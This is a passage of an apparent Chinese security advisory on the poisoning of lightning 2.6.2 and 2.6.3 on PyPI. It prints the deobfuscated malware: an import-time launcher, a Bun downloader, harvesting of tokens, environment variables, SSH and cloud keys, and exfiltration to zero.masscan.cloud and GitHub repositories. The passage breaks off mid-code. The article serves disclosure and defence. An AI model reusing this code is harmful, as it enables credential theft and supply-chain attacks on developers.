---
title: 墨思AI AGENT监测发现 PyTorch Lightning 训练框架被投毒，月下载量超1000万
url: https://mp.weixin.qq.com/s/yftKWsKCaZvk0GVb5HlVrw
source: Doonsec's feed
date: 2026-04-30
fetch_date: 2026-05-01T05:33:30.855701
---

# 墨思AI AGENT监测发现 PyTorch Lightning 训练框架被投毒，月下载量超1000万

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/cibAXD9R1dZ9QXI5RH7oJGCiboOK5gEnvDVYhan8bVAxyQde92jBpF5cLoHr4dMB5K3YiacSGlauCqel6UED56ecHK9WWRKEAVj8avfXb5Pfe8/0?wx_fmt=jpeg)

# 墨思AI AGENT监测发现 PyTorch Lightning 训练框架被投毒，月下载量超1000万

原创

安全实验室
安全实验室

墨菲安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/cibAXD9R1dZic6yDz5B1ia9ibz3pBic0kY3ibj0aAicbibDveicbpd1KDiaKQiaTHXIeYOkT7X4adwbEpqQWyg9dOrXBy4jsfo7Xrufam8dwcKESqiaTVXo/640?wx_fmt=gif&from=appmsg)

**01.**

概述

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/UiaccMk8iaCdyhFbuibJfzEmUpNeAKatohq2a0kMXTN6tendow7Qj7aOnGsPjwS9EmBUE8kOrZETRrVzUwlTY5icibg/640?from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1)

2026 年 4 月 30 日下午 8 点 50，墨菲安全研发的通用安全AI Agent 墨思监测发现，月下载量超1000万的 AI 训练框架 Lightning  的 PyPI 包遭遇供应链投毒，且截至发现时投毒版本仍未下架。Lightning 是基于 PyTorch 的深度学习训练框架，主要用于自动化模型训练流程，具备较高生态影响面。

本次投毒涉及 lightning 2.6.2 和 2.6.3 版本。攻击者在组件运行时文件中植入恶意代码，用户安装受影响版本并执行 import lightning 后即可触发窃密逻辑。恶意代码会收集开发者环境中的敏感凭据，包括环境变量、包管理器配置、Git/GitHub 凭据、SSH Key、云服务密钥、CI/CD 密钥、容器与集群配置、钱包文件、通信软件数据以及 Claude/Kiro MCP 等 AI 开发工具配置，并将数据回传至攻击者控制的服务器。

该事件属于高影响 Python / AI 生态供应链投毒攻击，攻击目标聚焦开发者主机、模型训练环境和 CI/CD 环境中的高价值凭据。建议已安装或导入受影响版本的用户立即排查环境、移除受影响版本，并轮换相关密钥。

**02.**

攻击者近期持续针对性投毒，前日SAP旗下组件受影响

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/UiaccMk8iaCdyhFbuibJfzEmUpNeAKatohq2a0kMXTN6tendow7Qj7aOnGsPjwS9EmBUE8kOrZETRrVzUwlTY5icibg/640?from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1)

4 月 29 日，NPM仓库中的@cap-js/db-service、@cap-js/sqlite 等多个组件也被发现存在同类恶意代码。作为 SAP CAP 框架的数据库服务核心组件，在npm中周下载量数十万次。

触发方式是 package.json 里的 preinstall 脚本和 lightning 侧的 start.py 是同一套逻辑的两种语言实现——相同的 Bun v1.3.13、相同的平台资产命名（bun-linux-x64-baseline/bun-darwin-aarch64等）、相同的 Alpine musl 探测，最终执行同体量的混淆 JS 载荷 execution.js（11,723,748 字节）。

```
```
setup.mjs      SHA256: 4066781fa830224c8bbcc3aa005a396657f9c8f9016f9a64ad44a9d7f5f45e34execution.js   SHA256: eb6eb4154b03ec73218727dc643d26f4e14dfda2438112926bb5daf37ae8bcdb
```
```

两个案例的时间间隔不到 24 小时，当前攻击者仍在持续用同类手法对其他开源组件投毒。

**03.**

投毒代码分析

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/UiaccMk8iaCdyhFbuibJfzEmUpNeAKatohq2a0kMXTN6tendow7Qj7aOnGsPjwS9EmBUE8kOrZETRrVzUwlTY5icibg/640?from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1)

以 lightning v2.6.2为例，投毒代码在 lightning/*runtime/router*runtime.js 中：

![](https://mmbiz.qpic.cn/mmbiz_png/cibAXD9R1dZicRhfmE77rZJfmSyK71LLtPsvcgFaSttfkesyCYmVOpd3qR2MhoNn4Gqtv6FLBx8avh6YFMpfVcTicLibkdJ8ibNqz9JkudhqMBjY/640?wx_fmt=png&from=appmsg)

反混淆后的恶意代码逻辑包括：

1. 导入即执行

文件路径：lightning/\_\_init\_\_.py，当用户 import lightning 时就会静默启动\_runtime/start.py：

```
```
import osimport subprocessimport sysimport threadingdef _run_runtime() -> None:    runtime_dir = os.path.join(os.path.dirname(__file__), "_runtime")    start = os.path.join(runtime_dir, "start.py")    if os.path.exists(start):        subprocess.Popen(            [sys.executable, start],            cwd=runtime_dir,            stdout=subprocess.DEVNULL,            stderr=subprocess.DEVNULL,        )threading.Thread(target=_run_runtime, daemon=True).start()
```
```

2. 下载 Bun 并执行恶意JS

文件路径：lightning/\_runtime/start.py，这一步把 Python 包变成了“恶意加载器”，如果本机没有 Bun，它会先下载解释器，再执行 router\_runtime.js。

```
```
BUN_VERSION = "1.3.13"ENTRY_SCRIPT = "router_runtime.js"def main():    local_bun = BUN_INSTALL_DIR / ("bun.exe" if is_win else "bun")    system_bun = shutil.which("bun")    if local_bun.exists():        bun_exec = str(local_bun)    elif system_bun:        bun_exec = system_bun    else:        asset = resolve_asset_name()        url = f"https://github.com/oven-sh/bun/releases/download/bun-v{BUN_VERSION}/{asset}.zip"        urllib.request.urlretrieve(url, zip_path)        # 解压出 bun 二进制到本地 .bun 目录    subprocess.run([bun_exec, str(SCRIPT_DIR / ENTRY_SCRIPT)], cwd=SCRIPT_DIR)
```
```

3. 主控流程：收集结果、建立外传通道、再决定是否横向传播

信息窃取不是单点窃密，而是“收集 -> 外传 -> 再传播”的完整攻击链：

```
```
async function main() {  await setupEnvironment(); // 俄语环境退出、非 CI 后台化、加锁  const primarySender = await new DomainSenderFactory({    domain: "zero.masscan.cloud",    port: 443,    path: "v1/telemetry",    dry_run: false,  }).tryCreate();  const quickResults = await Promise.all([    collectFilesystemSecrets(),    collectShellAndEnv(),    collectGitHubRunnerSecrets(),  ]);  const githubSender = await createGitHubSenderFromHiddenToken();  const selfGithubSender = await createGitHubSenderFromStolenPATs(quickResults);  const senders = [primarySender, githubSender, selfGithubSender].filter(Boolean);  const collectors = [    new AwsSsmCollector(),    new AwsSecretsManagerCollector(),    new AwsStsCollector(),    new AzureKeyVaultCollector(),    new GcpSecretManagerCollector(),  ];  for (const token of extractGitHubPATs(quickResults)) {    if (await isValidGitHubToken(token)) {      collectors.push(new GitHubActionsSecretsCollector(token));    }  }  await queueAndDispatch(quickResults, collectors, senders);  for (const runnerToken of extractRunnerTokens(quickResults)) {    await new GitHubRepoInfector(runnerToken).execute();  }}
```
```

4. 本地与 CI 凭据窃取

它会直接取 gh auth token，还会整包打走 process.env。在 GitHub Actions 里，它不是读普通配置文件，而是试图从 runner 运行环境中把 secrets 挖出来。敏感文件扫描面覆盖开发机、云凭据、Kubernetes、Docker、SSH、AI 工具配置。

```
```
async function collectShellAndEnv() {  const result = {};  try {    const token = execSync("gh auth token", {      encoding: "utf-8",      stdio: ["pipe", "pipe", "pipe"],    }).trim();    if (token) result.token = token;  } catch {}  result.environment = process.env;  return success(result);}async function collectGitHubRunnerSecrets() {  if (process.env.GITHUB_ACTIONS !== "true") return failure("Not Actions");  if (process.env.RUNNER_OS !== "Linux") return failure("Not running on Linux runner");  const dump = execSync(    `sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u`,    { input: K4f, encoding: "utf-8" }  );  // 从 runner 内存内容中抽取 GitHub Actions secrets  return success(parseSecrets(dump));}const HOTSPOTS = [  "**/.env",  "~/.aws/credentials",  "~/.config/gcloud/application_default_credentials.json",  "~/.kube/config",  "~/.npmrc",  "~/.pypirc",  "~/.ssh/id_rsa",  "/var/run/secrets/kubernetes.io/serviceaccount/token",  "~/.claude.json",  "~/.claude/mcp.json",  ".kiro/settings/mcp.json",];
```
```

5. 加密外传到攻击者域名

恶意代码先 gzip，再 AES-256-GCM，再用攻击者 RSA 公钥包一层。这说明作者明确考虑了被中途抓包和被动取证的问题。

```
```
async function createEnvelope(data) {  const gz = await gzip(Buffer.from(JSON.stringify(data)));  const aesKey = randomBytes(32);  const iv = randomBytes(12);  const encryptedKey = publicEncrypt(    {      key: ATTACKER_RSA_PUBLIC_KEY,      padding: constants.RSA_PKCS1_OAEP_PADDING,      oaepHash: "sha256",    },    aesKey  );  const cipher = createCipheriv("aes-256-gcm", aesKey, iv);  const ciphertext = Buffer.concat([    cipher.update(gz),    cipher.final(),    cipher.getAuthTag(),  ]);  return {    envelope: Buffer.concat([iv, ciphertext]).toString("base64"),    key: encryptedKey.toString("base64"),  };}async function sendToDomain(envelope) {  await fetch("https://zero.masscan.cloud:443/v1/telemetry", {    method: "POST",    headers: { "Content-Type": "application/json" },    body: JSON.stringify(envelope),  });}
```
```

6. GitHub 备用外传：隐藏 token + 新建仓库 + commit 数据

先去 GitHub 提交历史里搜一个隐藏标记，尝试捞出攻击者预埋的 token。成功后，它会新建公开仓库，把窃取结果提交到 results/results-\*.json。某些场景下它还会把新的 token 再次编码进 commit message，形成自举式通道。

```
```
async function findHiddenGitHubToken(optionalVictimToken) {  const url =    "https://api.github.com/search/commits" +    "?q=EveryBoiWeBuildIsAWormyBoi&sort=author-date&order=desc&per_page=50";  const results = await fetchJson(url, optionalVictimToken);  for (const item of results.items ?? []) {    const m = item.commit.message.match(      /^EveryBoiWeBuildIsAWormyBoi:([A-Za-z0-9+/]+={0,3})$/    );    if (!m) continue;    const token = Buffer.from(      Buffer.from(m[1], "base64").toString(),      "base64"    ).toString();    if (await hasRepoScope(token)) return createOctokit(token);  }  return false;}async function commitToRepo(envelope) {  const content = Buffer.from(JSON.stringify(envelope, null, 2), "utf...